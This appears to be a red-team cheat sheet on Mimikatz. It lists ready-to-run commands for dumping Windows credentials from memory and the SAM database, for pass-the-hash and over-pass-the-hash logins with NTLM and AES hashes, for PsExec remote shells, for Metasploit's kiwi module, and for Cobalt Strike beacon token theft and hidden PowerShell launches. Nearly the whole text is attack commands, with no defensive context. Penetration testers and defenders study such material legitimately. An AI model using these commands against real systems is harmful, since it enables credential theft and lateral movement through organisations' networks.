# Mimikatz

## 01 - Manual

### 1.1 - Dump the hashes

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

mimikatz # lsadump::sam
```

### 1.2 - Over Pass the Hash

```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain_name> /ntlm:<NTLM_hash> /run:<commands>

mimikatz # sekurlsa::pth /user:<username> /domain:<domain_name> /aes256:<aes256_hash> /ntlm:<NTLM_hash> /aes128:<aes128_hash> /run:<commands>

C:\> PsExec64.exe -accepteula \\<IP> cmd.exe
```

## 02 - Metasploit

### 2.1 - Kiwi

```
meterpreter > load kiwi

meterpreter > kiwi_cmd
```

## 03 - Havoc

TODO: Demonstrate pass the hash in Havoc

## 04 - Cobalt Strike

```
beacon> pth <username> aad3b435b51404eeaa3b435b51404ee:<NT> <commands>

beacon> pth Administrator aad3b435b51404eeaa3b435b51404ee:<NT> powershell -w hidden

beacon> steal_token <powershell_process_id>
```

## References

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)